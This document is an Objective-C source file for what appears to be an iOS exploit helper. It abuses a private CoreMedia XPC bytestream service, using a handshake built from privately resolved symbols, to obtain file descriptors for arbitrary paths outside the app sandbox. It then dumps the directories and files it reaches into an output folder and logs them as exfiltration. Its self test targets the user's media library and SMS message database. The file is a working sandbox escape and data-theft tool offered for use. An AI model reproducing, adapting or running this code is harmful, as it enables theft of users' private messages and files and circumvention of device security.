// Fig.m - CoreMedia bytestream XPC helper (iOS 26.5 / 27.0 / 27.0.1)
//
// For every line of Documents/queue.txt of the form  tag<TAB>path[<TAB>service]:
//   1. build a 'Curl' create message and put the absolute path into CreationURL
//   2. take the dup'ed FileDescriptor out of the ByteStreamDetails reply
//   3. directory -> fdopendir/readdir ; file -> fstat + pread into Documents/out
// Writes are refused server side on this path; writes go through AirLift on the host.
//
// Build requirement: GCC_ENABLE_OBJC_ARC = NO (see project.yml).
// No retain/release anywhere: one-shot process, leaks are irrelevant.

#import "Fig.h"

#import <xpc/xpc.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <dirent.h>
#import <errno.h>
#import <stdarg.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>

#pragma mark - Symbols

typedef int32_t      (*fn_basic)(uint32_t cmd, uint64_t err, xpc_object_t *out);
typedef int32_t      (*fn_begin)(xpc_object_t msg);
typedef int32_t      (*fn_comp)(xpc_object_t reply, xpc_object_t *origin);
typedef int32_t      (*fn_recip)(xpc_object_t m1, xpc_object_t m2,
                                 const char *tag, xpc_object_t *recip);
typedef int32_t      (*fn_seturl)(xpc_object_t msg, const char *key, CFURLRef url);
typedef void         (*fn_setu64)(xpc_object_t msg, const char *key, uint64_t v);
typedef xpc_object_t (*fn_val)(xpc_object_t msg, const char *key);
typedef uint64_t     (*fn_u64)(xpc_object_t msg, const char *key);
typedef int64_t      (*fn_i64)(xpc_object_t msg, const char *key);
typedef int32_t      (*fn_dupfd)(xpc_object_t msg, const char *key);
typedef xpc_connection_t (*fn_conncreate)(const char *name, dispatch_queue_t target, uint64_t flags);

static fn_basic  fBasic;
static fn_begin  fBegin;
static fn_comp   fComp;
static fn_recip  fRecip;
static fn_seturl fSetURL;
static fn_setu64 fSetU64;
static fn_val    fVal;
static fn_u64    fU64;
static fn_i64    fI64;
static fn_dupfd  fDupFd;
static fn_conncreate fConnCreate;

static xpc_connection_t gConn;
static NSMutableArray  *gProduced;
static NSString        *gOutDir;
static NSString        *gDocs;
static NSString        *gLogPath;

static const char *kDefaultService =
    "com.apple.coremedia.mediaplaybackd.bytestream.xpc";

#pragma mark - Logging

static void logLine(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);

    NSLog(@"[fig] %@", s);

    if (gLogPath == nil) return;
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:gLogPath];
    if (fh == nil) {
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:gLogPath];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh closeFile];
}

static BOOL writeText(NSString *name, NSString *body) {
    NSString *p = [gOutDir stringByAppendingPathComponent:name];
    BOOL ok = [body writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:nil];
    if (ok) [gProduced addObject:name];
    return ok;
}

#pragma mark - Connection and handshake

static xpc_object_t sendSync(xpc_object_t msg) {
    if (msg == nil || gConn == nil) return nil;
    __block xpc_object_t reply = nil;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    xpc_connection_send_message_with_reply(gConn, msg,
        dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0),
        ^(xpc_object_t object) {
            if (object != nil) {
                // The reply is only valid for the duration of this block, so take a +1
                // before handing it back to the caller. Without this the caller holds a
                // dangling pointer and the next xpc_get_type() traps on PAC (SIGTRAP).
                xpc_retain(object);
                reply = object;
            }
            dispatch_semaphore_signal(sem);
        });

    if (dispatch_semaphore_wait(sem,
            dispatch_time(DISPATCH_TIME_NOW, (int64_t)(8ull * NSEC_PER_SEC))) != 0) {
        return nil;
    }
    return reply;
}

static BOOL resolveSymbols(void) {
    if (fBasic != nil) return YES;

    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                      RTLD_NOW | RTLD_LOCAL);
    if (cm == nil) {
        logLine(@"dlopen CoreMedia failed: %s", dlerror());
        return NO;
    }

    void *rtld = (void *)-2;   // RTLD_DEFAULT

    fBasic  = (fn_basic)  dlsym(cm, "FigXPCCreateBasicMessage");
    fBegin  = (fn_begin)  dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
    fComp   = (fn_comp)   dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");
    fRecip  = (fn_recip)  dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
    fSetURL = (fn_seturl) dlsym(cm, "FigXPCMessageSetCFURL");

    fVal    = (fn_val)    dlsym(rtld, "xpc_dictionary_get_value");
    fU64    = (fn_u64)    dlsym(rtld, "xpc_dictionary_get_uint64");
    fI64    = (fn_i64)    dlsym(rtld, "xpc_dictionary_get_int64");
    fDupFd  = (fn_dupfd)  dlsym(rtld, "xpc_dictionary_dup_fd");
    fSetU64 = (fn_setu64) dlsym(rtld, "xpc_dictionary_set_uint64");
    // Marked unavailable in the iOS SDK headers, so it is resolved through dlsym.
    fConnCreate = (fn_conncreate) dlsym(rtld, "xpc_connection_create_mach_service");

    if (fBasic == nil || fBegin == nil || fComp == nil || fRecip == nil ||
        fSetURL == nil || fDupFd == nil || fVal == nil || fU64 == nil ||
        fConnCreate == nil) {
        logLine(@"dlsym missing: basic=%p begin=%p comp=%p recip=%p seturl=%p dupfd=%p",
                fBasic, fBegin, fComp, fRecip, fSetURL, fDupFd);
        return NO;
    }
    return YES;
}

static BOOL connectService(const char *name) {
    if (gConn != nil) {
        xpc_connection_cancel(gConn);
        gConn = nil;
    }
    gConn = fConnCreate(name, nil, 0);
    if (gConn == nil) {
        logLine(@"connect failed: %s", name);
        return NO;
    }
    xpc_connection_set_event_handler(gConn, ^(xpc_object_t event) { /* ignore */ });
    xpc_connection_resume(gConn);
    logLine(@"STEP2 connected to %s", name);
    return YES;
}

static BOOL handshake(void) {
    // '.rp1' : memory recipient, first message
    xpc_object_t m1 = nil;
    if (fBasic(0x2e727031, 0, &m1) != 0 || m1 == nil) {
        logLine(@"STEP3 rp1 basic message failed");
        return NO;
    }
    xpc_object_t r1 = sendSync(m1);
    if (r1 == nil || xpc_get_type(r1) != XPC_TYPE_DICTIONARY) {
        logLine(@"STEP3 rp1 reply is not a dictionary");
        if (r1 != nil) xpc_release(r1);
        return NO;
    }
    logLine(@"STEP3 rp1 reply=dictionary");

    // '.rp2' : fold the first reply into the recipient context
    xpc_object_t m2 = nil;
    if (fBasic(0x2e727032, 0, &m2) == 0 && m2 != nil) {
        xpc_object_t recip = nil;
        int32_t rs = fRecip(r1, m2, "mconf", &recip);
        if (recip != nil) xpc_release(recip);
        xpc_object_t r2 = sendSync(m2);
        logLine(@"STEP3 rp2 recipSt=%d reply=%s",
                rs, (r2 != nil && xpc_get_type(r2) == XPC_TYPE_DICTIONARY) ? "dict" : "other");
        if (r2 != nil) xpc_release(r2);
    }
    xpc_release(r1);

    // '.org' : memory origin begin / complete
    xpc_object_t om = nil;
    if (fBasic(0x2e6f7267, 0, &om) != 0 || om == nil) {
        logLine(@"STEP3 org basic message failed");
        return NO;
    }
    int32_t bs = fBegin(om);
    xpc_object_t orr = sendSync(om);
    BOOL ok = NO;
    if (orr != nil && xpc_get_type(orr) == XPC_TYPE_DICTIONARY) {
        xpc_object_t origin = nil;
        int32_t cs = fComp(orr, &origin);
        ok = (origin != nil);
        logLine(@"STEP3 org beginSt=%d completeSt=%d origin=%s",
                bs, cs, ok ? "true" : "false");
        if (origin != nil) xpc_release(origin);
    } else {
        logLine(@"STEP3 org beginSt=%d reply missing", bs);
    }
    if (orr != nil) xpc_release(orr);
    return ok;
}

#pragma mark - fd handling

static void takeFd(NSString *tag, int32_t fd) {
    struct stat st;
    int fs = fstat(fd, &st);

    // directory: real readdir
    if (fs == 0 && (st.st_mode & 0170000) == 0040000) {
        DIR *dp = fdopendir(fd);
        if (dp == nil) {
            logLine(@"DIR[%@] fdopendir failed errno=%d", tag, errno);
            close(fd);
            return;
        }
        NSMutableArray *names = [NSMutableArray array];
        struct dirent *de;
        while ((de = readdir(dp)) != nil && names.count < 4000) {
            NSString *n = [NSString stringWithUTF8String:de->d_name];
            if (n != nil && ![n isEqualToString:@"."] && ![n isEqualToString:@".."]) {
                [names addObject:n];
            }
        }
        closedir(dp);
        NSArray *sorted = [names sortedArrayUsingSelector:@selector(compare:)];
        NSString *body = [[sorted componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
        writeText([tag stringByAppendingString:@".dir"], body);
        logLine(@"DIR[%@] entries=%lu", tag, (unsigned long)names.count);
        return;
    }

    // file: meta + content
    int64_t size = (fs == 0) ? (int64_t)st.st_size : (int64_t)-1;
    unsigned char head[64];
    memset(head, 0, sizeof(head));
    ssize_t got = pread(fd, head, sizeof(head), 0);

    NSMutableString *hex = [NSMutableString string];
    for (ssize_t i = 0; i < got && i < (ssize_t)sizeof(head); i++) {
        [hex appendFormat:@"%02x", head[i]];
    }

    NSString *meta = [NSString stringWithFormat:
        @"tag=%@\nsize=%lld\nuid=%u\nmode=%o\nhead64=%@\n",
        tag, size,
        (fs == 0) ? st.st_uid : 0,
        (fs == 0) ? (unsigned)st.st_mode : 0,
        hex];
    writeText([tag stringByAppendingString:@".meta"], meta);
    logLine(@"META[%@] size=%lld uid=%u", tag, size, (fs == 0) ? st.st_uid : 0);

    if (size > 0 && size <= (int64_t)8 * 1000 * 1000) {
        NSMutableData *buf = [NSMutableData dataWithLength:(NSUInteger)size];
        ssize_t full = pread(fd, buf.mutableBytes, (size_t)size, 0);
        if (full > 0) {
            [buf setLength:(NSUInteger)full];
            NSString *name = [tag stringByAppendingString:@".bin"];
            NSString *p = [gOutDir stringByAppendingPathComponent:name];
            if ([buf writeToFile:p atomically:YES]) {
                [gProduced addObject:name];
                logLine(@"EXFIL[%@] %zdB", tag, full);
            }
        } else {
            logLine(@"EXFIL[%@] pread failed errno=%d", tag, errno);
        }
    } else if (size > (int64_t)8 * 1000 * 1000) {
        logLine(@"SKIP[%@] size=%lld above 8MB cap, meta only", tag, size);
    }

    close(fd);
}

#pragma mark - single probe

static void probe(NSString *tag, NSString *path) {
    xpc_object_t msg = nil;
    if (fBasic(0x4375726c, 0, &msg) != 0 || msg == nil) {   // 'Curl'
        logLine(@"PROBE[%@] basic message failed", tag);
        return;
    }
    CFURLRef url = (__bridge CFURLRef)[NSURL fileURLWithPath:path];
    fSetURL(msg, "CreationURL", url);
    fSetU64(msg, "FileOpenOptions", 0);

    xpc_object_t reply = sendSync(msg);
    if (reply == nil) {
        logLine(@"PROBE[%@] timeout", tag);
        return;
    }
    if (xpc_get_type(reply) != XPC_TYPE_DICTIONARY) {
        logLine(@"PROBE[%@] reply is not a dictionary", tag);
        xpc_release(reply);
        return;
    }

    xpc_object_t details = fVal(reply, "ByteStreamDetails");
    if (details == nil) {
        logLine(@"DENIED[%@] err=%lld path=%@", tag, fI64(reply, ".ErrorReturn"), path);
        xpc_release(reply);
        return;
    }

    uint64_t oid = fU64(details, "ObjectID");
    uint64_t len = fU64(details, "EntireLength");
    int32_t  fd  = fDupFd(details, "FileDescriptor");
    logLine(@"STREAM[%@] oid=%llu len=%llu dpid=%llu path=%@",
            tag, oid, len, fU64(details, "ServerPID"), path);

    if (fd >= 0) {
        takeFd(tag, fd);
    } else {
        logLine(@"STREAM[%@] no FileDescriptor in details", tag);
    }
    xpc_release(reply);
}

#pragma mark - queue entry

static void finishup(void) {
    NSString *index = [gProduced componentsJoinedByString:@"\n"];
    if (index.length > 0) index = [index stringByAppendingString:@"\n"];
    writeText(@"index.txt", index);
    [@"done" writeToFile:[gDocs stringByAppendingPathComponent:@"DONE"]
              atomically:YES encoding:NSUTF8StringEncoding error:nil];
}

int figRun(void) {
    gDocs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    gOutDir = [gDocs stringByAppendingPathComponent:@"out"];
    gLogPath = [gDocs stringByAppendingPathComponent:@"fig.log"];
    gProduced = [NSMutableArray array];

    [[NSFileManager defaultManager] createDirectoryAtPath:gOutDir
                             withIntermediateDirectories:YES attributes:nil error:nil];
    [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

    logLine(@"=== fighelper start ===");
    logLine(@"docs=%@", gDocs);

    if (!resolveSymbols()) {
        finishup();
        return -1;
    }
    if (!connectService(kDefaultService) || !handshake()) {
        logLine(@"handshake failed: service name or OS build mismatch");
        finishup();
        return -2;
    }

    NSString *qpath = [gDocs stringByAppendingPathComponent:@"queue.txt"];
    NSString *queue = [NSString stringWithContentsOfFile:qpath
                                                encoding:NSUTF8StringEncoding error:nil];
    if (queue.length == 0) {
        logLine(@"queue.txt empty: running built-in self test");
        probe(@"ctrl-medialib", @"/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb");
        probe(@"ctrl-dir",      @"/private/var/mobile/Media/iTunes_Control/iTunes");
        probe(@"ctrl-enoent",   @"/private/var/mobile/Media/iTunes_Control/iTunes/fighelper_no_such_file");
        probe(@"ctrl-outside",  @"/private/var/mobile/Library/SMS/sms.db");
    } else {
        NSArray *lines = [queue componentsSeparatedByString:@"\n"];
        for (NSString *line in lines) {
            if (line.length == 0) continue;
            NSArray *p = [line componentsSeparatedByString:@"\t"];
            if (p.count < 2) continue;

            NSString *tag  = p[0];
            NSString *path = p[1];

            if (p.count >= 3 && [(NSString *)p[2] length] > 0) {
                if (!connectService([(NSString *)p[2] UTF8String])) continue;
                if (!handshake()) {
                    logLine(@"handshake failed on %@", p[2]);
                    continue;
                }
            }
            probe(tag, path);
        }
    }

    finishup();
    logLine(@"=== fighelper end, %lu artifacts ===", (unsigned long)gProduced.count);
    return 0;
}
